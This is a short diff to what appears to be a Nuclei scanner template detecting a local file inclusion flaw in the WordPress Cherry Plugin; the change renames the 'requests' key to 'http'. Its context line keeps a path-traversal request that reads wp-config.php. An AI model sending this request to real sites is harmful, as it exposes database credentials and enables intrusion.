@@ -10,7 +10,7 @@ info:
     - https://github.com/CherryFramework/cherry-plugin
   tags: wordpress,wp-plugin,lfi
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php'
